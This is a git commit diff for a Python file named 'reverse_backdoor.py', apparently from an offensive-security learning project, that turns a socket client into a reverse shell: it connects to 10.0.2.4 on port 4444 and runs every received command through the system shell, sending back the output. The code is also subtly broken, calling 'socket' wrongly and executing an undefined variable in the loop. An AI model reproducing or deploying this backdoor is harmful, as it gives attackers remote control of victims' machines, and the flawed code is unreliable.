8b59b7c399bd9839b89964b6e7b07e32f069b2b3
Mário Gil <mg_mesquita@hotmail.com>
2018-08-04 20:47:37 +0100

    Executing system commands

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,14 +1,21 @@
 #!/usr/bin/env python
 
-import socket
+import socket, subprocess
+
+
+def execute_system_command(command):
+	return subprocess.check_output(command, shell=True)
 
 connection = socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("10.0.2.4", 4444))
 
 connection.send("\n[+] Connection established.\n")
 
-received_data = connection.recv(1024)
-print(received_data)
+
+while True:
+	command = connection.recv(1024)
+	command_result = execute_system_command(received_data)
+	connection.send(command_result)
 
 
 connection.close()
